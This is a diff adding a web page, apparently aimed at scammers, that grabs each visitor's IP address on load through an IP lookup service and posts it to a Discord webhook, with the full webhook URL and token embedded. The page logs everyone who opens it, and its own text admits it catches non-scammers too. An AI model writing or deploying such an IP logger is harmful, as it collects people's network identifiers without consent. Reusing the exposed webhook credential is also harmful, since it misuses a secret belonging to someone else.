@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" 
+          content="width=device-width, initial-scale=1.0">
+    <title>Getting Client's IP</title>
+    <style>
+        p, h1 {
+            color: green;
+        }
+    </style>
+</head>
+
+<body>
+    <center>
+        <h1>Hi scammer!</h1>
+        <h3>Your ip address, listed below, has been sent to our database! We hope you have fun scamming more people!</h3>
+        <p>If you are not a scammer and were just looking around, oops! sorry!</p>
+        <p id="ip-address"></p>
+    </center>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            // Fetch the IP address from the API
+            fetch("https://api.ipify.org?format=json")
+                .then(response => response.json())
+                .then(data => {
+                    // Display the IP address on the screen
+                    document.getElementById("ip-address").textContent = data.ip;
+                    const request = new XMLHttpRequest();
+                    request.open("POST","https://discord.com/api/webhooks/1298288468669104251/eigPZDWj3RBfLKJXWbzG0EwHOPszUJg9jTkDrOGeTKq3zCdgpRUDf0eASms4K5P5kPwh")
+                    request.setRequestHeader('Content-type', 'application/json')
+                    const params = {
+                        username: "Scammer Ip Getter",
+                        avater_url: "",
+                        content: data.ip
+                    }
+                    request.send(JSON.stringify(params));
+                })
+                .catch(error => {
+                    console.error("Error fetching IP address:", error);
+                });
+        });
+    </script>
+</body>
+
+</html>
